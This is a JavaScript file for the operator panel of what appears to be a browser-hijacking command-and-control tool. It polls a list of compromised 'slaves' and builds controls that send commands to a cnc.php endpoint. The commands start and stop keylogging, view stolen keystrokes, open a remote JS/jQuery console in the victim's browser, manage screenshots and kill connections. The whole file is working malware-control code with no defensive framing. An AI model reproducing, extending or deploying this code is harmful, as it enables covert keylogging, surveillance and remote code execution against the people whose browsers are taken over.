function pollSlaves() {
  $.ajax({
      type: 'GET',
      url: './ajax/slaves.php?cb=' + Math.floor((Math.random() * 99999999) + 1),
      success: function(html) {
        $('.slavesArea').html(html);
      }
  })
}
$("#closeSlaveViewPort").click(function() {
  $( "#slaveViewPort" ).hide();
  $('.slaveVierPortContent').html('');
  $('.slaveHeader').html('');
});

function manageSlave( uuid, keylog ) {
  $( "#slaveViewPort" ).show();
  $('.slaveHeader').html(uuid);
  //html = html + "<input type='hidden' name='' value='' />";
  var html = "<form id='closeConnection' class='slaveViewPortForm' action='ajax/cnc.php' method='post'>";
  html = html + "<input type='hidden' name='uuid' value='" + uuid + "' />";
  html = html + "<input type='hidden' name='cmd' value='close' />";
  html = html + "<button id=\"custom_off\" type=\"submit\" onclick=\"formSubmit(this); return false;\" class=\"btn btn-primary\">Kill Connection Page</button></form>";
  if(keylog == 'true') {
    html = html + "<form id='stopkeylogging' class='slaveViewPortForm' action='ajax/cnc.php' method='post'>";
    html = html + "<input type='hidden' name='uuid' value='" + uuid + "' />";
    html = html + "<input type='hidden' name='cmd' value='stopkeylog' />";
    html = html + "<button id=\"custom_off\" type=\"submit\" onclick=\"keylogBtn('stop'); formSubmit(this,'start'); return false;\" class=\"btn btn-primary klbtn\">Stop Keyloging</button></form>";
  } else {
    html = html + "<form id='startkeylogging' class='slaveViewPortForm' action='ajax/cnc.php' method='post'>";
    html = html + "<input type='hidden' name='uuid' value='" + uuid + "' />";
    html = html + "<input type='hidden' name='cmd' value='keylog' />";
    html = html + "<button id=\"custom_on\" type=\"submit\" onclick=\"keylogBtn('start'); formSubmit(this,'stop'); return false;\" class=\"btn btn-primary klbtn\">Start Keyloging</button></form>";
  }
  html = html + "<a href=\"pages/logview.php?uuid=" + uuid + "\" onclick=\"window.open(this.href,'targetWindow','toolbar=no,location=no";
  html = html + ",menubar=no,scrollbars=yes,resizable=yes,width=750,height=800');return false;\">";
  html = html + "<button id=\"custom\" type=\"submit\" class=\"btn btn-primary\">Manage Keylogs</button></a>";

  html = html + "<a href=\"pages/console.php?uuid=" + uuid + "\" onclick=\"window.open(this.href,'targetWindow','toolbar=no,location=no";
  html = html + ",menubar=no,scrollbars=yes,resizable=yes,width=750,height=800');return false;\">";
  html = html + "<button id=\"custom\" type=\"submit\" class=\"btn btn-primary\">JS/JQuery Console</button></a>";

  html = html + "<a href=\"pages/scview.php?uuid=" + uuid + "\" onclick=\"window.open(this.href,'targetWindow','toolbar=no,location=no";
  html = html + ",menubar=no,scrollbars=yes,resizable=yes,width=750,height=800');return false;\">";
  html = html + "<button id=\"custom\" type=\"submit\" class=\"btn btn-primary\">Screenshot Manager</button></a>";

  /* Plugin support coming soon :) */
  //html = html + "<a href=\"pages/lmodmanage.php?uuid=" + uuid + "\" onclick=\"window.open(this.href,'targetWindow','toolbar=no,location=no";
  //html = html + ",menubar=no,scrollbars=yes,resizable=yes,width=750,height=800');return false;\">";
  //html = html + "<button id=\"custom\" type=\"submit\" class=\"btn btn-primary\">Loaded Module Manager</button></a>";

  $('.slaveVierPortContent').html(html);
}

function keylogBtn(state) {
  if(state == 'start') {
    $(".klbtn").css('background-color', 'red');
    $(".klbtn").css('border-color', 'red');
    $(".klbtn").attr("onclick","keylogBtn('stop'); formSubmit(this,'start'); return false;");
    $(".klbtn").html("Stop Keyloging");
  } else if(state == 'stop') {
    $(".klbtn").css('background-color', 'green');
    $(".klbtn").css('border-color', 'green');
    $(".klbtn").attr("onclick","keylogBtn('start'); formSubmit(this,'stop'); return false;");
    $(".klbtn").html("Start Keyloging");
  } else {
    console.log('...????????????????????????? [keylogBtn]')
  }
}

function formSubmit(data, arg) {
    var idForm = data.form.id;
    $("#" + idForm).ajaxSubmit({
      cache: false,
      dataType: "text",
      success: function(ret){
        if(ret == "cooldown") {
          if(arg == 'start') {
            keylogBtn('start');
          } else if(arg == 'stop') {
            keylogBtn('stop');
          }
          alert("ERROR: Could not execute command\n\nCooldown still in effect... Please allow for a full 35 second cooldown after each command...");
          return false;
        }
      }
    });
    return false;
}

pollSlaves();
setInterval(pollSlaves, 15000)
